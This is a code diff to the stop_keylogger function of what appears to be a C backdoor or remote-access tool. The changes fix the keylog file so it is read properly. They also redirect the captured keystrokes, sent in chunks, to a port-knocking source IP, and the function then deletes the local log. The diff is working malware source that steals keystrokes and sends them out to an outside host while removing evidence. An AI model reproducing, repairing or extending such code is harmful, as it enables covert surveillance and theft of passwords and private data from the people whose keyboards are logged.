@@ -229,7 +229,7 @@ void stop_keylogger(struct session_info * session_info) {
     pthread_join(session_info->keylogger_thread, NULL);
 
     // Send the keylog file
-    FILE * log_file = fopen(KEYLOG_FILE_PATH, "w");
+    FILE * log_file = fopen(KEYLOG_FILE_PATH, "r");
     if (log_file == NULL) {
         log_message("Failed to open keylog file: %s", KEYLOG_FILE_PATH);
     }
@@ -241,15 +241,15 @@ void stop_keylogger(struct session_info * session_info) {
     }
 
     // Send over the filename and the FILENAME command
-    send_message(session_info->client_options_->client_fd, session_info->client_options_->host, RECEIVING_PORT, KEYLOG_FILE_PATH);
+    send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, KEYLOG_FILE_PATH);
     usleep(500000);
-    send_command(session_info->client_options_->client_fd, session_info->client_options_->host, RECEIVING_PORT, FILENAME);
+    send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, FILENAME);
 
     size_t chunk_count = 0;
     size_t chunk_bytes;
     while ((chunk_bytes = fread(file_buffer, 1, MESSAGE_BUFFER_LENGTH - 1, log_file)) > 0) {
         file_buffer[chunk_bytes] = '\0';
-        send_message(session_info->client_options_->client_fd, session_info->client_options_->host, RECEIVING_PORT, file_buffer);
+        send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, file_buffer);
         chunk_count++;
         log_message("Sent chunk %zu (%zu bytes)\n", chunk_count, chunk_bytes);
     }
@@ -260,7 +260,7 @@ void stop_keylogger(struct session_info * session_info) {
     free(file_buffer);
 
     usleep(500000);
-    send_command(session_info->client_options_->client_fd, session_info->client_options_->host, RECEIVING_PORT, SEND_FILE);
+    send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, SEND_FILE);
 
     // Delete keylog file
     if (remove(KEYLOG_FILE_PATH) != 0) {
